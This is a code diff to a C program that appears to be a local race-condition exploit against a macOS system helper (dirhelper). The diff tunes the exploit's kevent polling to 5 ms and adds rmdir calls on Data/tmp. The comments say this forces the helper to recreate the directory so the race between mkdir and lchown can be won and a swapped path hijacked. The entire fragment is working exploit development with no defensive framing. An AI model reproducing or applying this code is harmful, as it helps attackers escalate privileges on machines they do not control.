@@ -163,7 +163,7 @@ static int race_loop(int timeout_secs) {
     int data_fd = -1;
     struct kevent change, event;
     struct stat st;
-    struct timespec timeout = { 0, 10000000 };  /* 10ms poll */
+    struct timespec timeout = { 0, 5000000 };  /* 5ms poll */
     time_t start_time = time(NULL);
     time_t last_progress = start_time;
     
@@ -184,6 +184,13 @@ static int race_loop(int timeout_secs) {
             printf("\n[!] Timeout reached (%d seconds)\n", timeout_secs);
             break;
         }
+        
+        /* 
+         * CRITICAL: Remove Data/tmp so dirhelper creates it fresh!
+         * If Data/tmp already exists, dirhelper skips mkdir() and goes
+         * straight to lchown() - we'd miss the race window entirely.
+         */
+        rmdir(g_data_tmp);
         
         /* Ensure Data directory exists for monitoring */
         if (lstat(g_data_dir, &st) != 0) {
@@ -249,6 +256,9 @@ static int race_loop(int timeout_secs) {
                     
                     /* Didn't win - undo and continue */
                     undo_swap();
+                    
+                    /* Remove Data/tmp so next trigger creates it fresh */
+                    rmdir(g_data_tmp);
                 } else {
                     /* Swap failed - just remove Data/tmp and continue */
                     rmdir(g_data_tmp);
@@ -413,3 +423,4 @@ int main(int argc, char *argv[]) {
     
     return result;
 }
+
